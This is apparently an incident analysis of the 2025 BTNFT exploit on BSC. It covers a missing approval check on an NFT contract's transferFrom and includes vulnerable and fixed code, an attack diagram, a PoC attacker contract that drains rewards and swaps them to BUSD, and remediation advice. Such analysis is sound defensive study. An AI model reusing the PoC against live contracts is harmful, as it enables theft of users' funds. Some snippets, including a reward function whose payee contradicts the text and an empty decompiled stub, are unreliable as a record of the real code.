# BTNFT — Reward Theft via Unauthorized NFT Transfer Analysis

| Field | Details |
|------|------|
| **Date** | 2025-04-15 |
| **Protocol** | BTNFT |
| **Chain** | BSC |
| **Loss** | 19,025 BUSD |
| **Attacker** | [0xbda2a27cdb2ffd4258f3b1ed664ed0f28f9e0fc3](https://bscscan.com/address/0xbda2a27cdb2ffd4258f3b1ed664ed0f28f9e0fc3) |
| **Attack Tx 1** | [0x1e90cbff...](https://bscscan.com/tx/0x1e90cbff665c43f91d66a56b4aa9ba647486a5311bb0b4381de4d653a9d8237d) |
| **Attack Tx 2** | [0x7978c002...](https://bscscan.com/tx/0x7978c002d12be9b748770cc31cbaa1b9f3748e4083c9f419d7a99e2e07f4d75f) |
| **Vulnerable Contract** | [0x0FC91B6Fea2E7A827a8C99C91101ed36c638521B](https://bscscan.com/address/0x0FC91B6Fea2E7A827a8C99C91101ed36c638521B) |
| **Root Cause** | No access control on ERC721 transferFrom, allowing anyone to transfer another user's NFT to the contract |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-04/BTNFT_exp.sol) |

---

## 1. Vulnerability Overview

The BTNFT contract was a system that distributed BTT token rewards to NFT holders. However, due to missing access control on the `transferFrom()` function, an attacker could transfer any NFT to the BTNFT contract without approval. Transferring an NFT to the contract triggered the reward claim mechanism, which then sent BTT tokens to the attacker.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable transferFrom: no approval check
contract BTNFT is ERC721 {
    function transferFrom(
        address from,
        address to,
        uint256 tokenId
    ) public override {
        // ❌ Missing _isApprovedOrOwner(msg.sender, tokenId) check!
        // Anyone can transfer any NFT

        if (to == address(this)) {
            // Sending NFT to itself triggers reward payout
            _claimRewards(from, tokenId);
        }
        _transfer(from, to, tokenId);
    }

    function _claimRewards(address recipient, uint256 tokenId) internal {
        uint256 reward = calculateReward(tokenId);
        IERC20(BTT).transfer(recipient, reward); // ❌ Transfers to msg.sender
    }
}

// ✅ Correct code
function transferFrom(address from, address to, uint256 tokenId)
    public override {
    require(
        _isApprovedOrOwner(msg.sender, tokenId),
        "Not approved" // ✅ Approval check
    );
    // ...
}
```

### On-Chain Original Code

Source: Sourcify verified

```solidity
// File: BTNFT_decompiled.sol
contract BTNFT {
    function transferFrom(address a, address b, uint256 c) external {  // ❌ Vulnerability
        // TODO: decompile logic not implemented
    }
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─[Tx1] ─► Iterate over all NFT IDs (1 ~ totalSupply)
  │            └─► Identify the actual owner of each NFT
  │            └─► BTNFT.transferFrom(owner, BTNFT_CONTRACT, tokenId)
  │                  └─► ❌ Transfer succeeds without approval
  │                  └─► _claimRewards() triggered → BTT tokens received
  │
  ├─[Tx2] ─► Swap collected BTT tokens for BUSD on PancakeSwap
  │            └─► Split into 50 swaps to minimize slippage
  │
  └─[Result] ─► Net profit: 19,025 BUSD
```

## 4. PoC Code (Core Logic + Comments)

```solidity
contract AttackerC {
    function attackTx1() external {
        uint256 totalSupply = IERC721Enumerable(BTNFT).totalSupply();

        // [1] Force-transfer all NFTs to the BTNFT contract
        for (uint256 i = 1; i < totalSupply; i++) {
            address owner = IERC721(BTNFT).ownerOf(i);
            // ❌ Can transfer another user's NFT without approval (core vulnerability)
            IERC721(BTNFT).transferFrom(owner, BTNFT, i);
            // Internally, each NFT's reward is transferred to the attacker
        }
    }

    function attackTx2() external {
        // [2] Swap collected BTT tokens for BUSD
        IERC20(BTT).approve(pair, type(uint256).max);

        uint256 totalBal = IERC20(BTT).balanceOf(address(this));
        uint256 amountPerLoop = totalBal / 50;

        address[2] memory path;
        path[0] = BTT;
        path[1] = BUSD;

        // 50 split swaps to minimize slippage
        for (uint256 i; i < 50; i++) {
            IRouterBTT(router).swap(path, false, amountPerLoop);
        }

        // [3] Transfer BUSD profit
        IERC20(BUSD).transfer(
            msg.sender,
            IERC20(BUSD).balanceOf(address(this))
        );
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|------|
| **Vulnerability Type** | Missing Access Control |
| **Attack Technique** | ERC721 transferFrom approval bypass |
| **DASP Category** | Access Control |
| **CWE** | CWE-284: Improper Access Control |
| **Severity** | Critical |
| **Attack Complexity** | Low |

## 6. Remediation Recommendations

1. **ERC721 Standard Compliance**: Use OpenZeppelin's ERC721 implementation as-is, or when overriding, always include the `_isApprovedOrOwner()` check.
2. **Separate Reward Claim Logic**: Decouple NFT transfer and reward claiming into separate functions, and explicitly verify ownership at the time of reward claim.
3. **Whitelist Transfers**: Restrict transfers to the BTNFT contract so that only the actual owner can initiate them.

## 7. Lessons Learned

- **Importance of the ERC721 Standard**: Omitting approval logic when customizing `transferFrom` in an NFT contract introduces a critical vulnerability.
- **Two-Phase Attack**: This attack was split across two transactions (claim → sell). This is a strategy to bypass single-transaction defenses.
- **Auditing NFT Reward Mechanisms**: Whenever rewards are tied to transferring or burning an NFT into a contract, access control must be rigorously reviewed.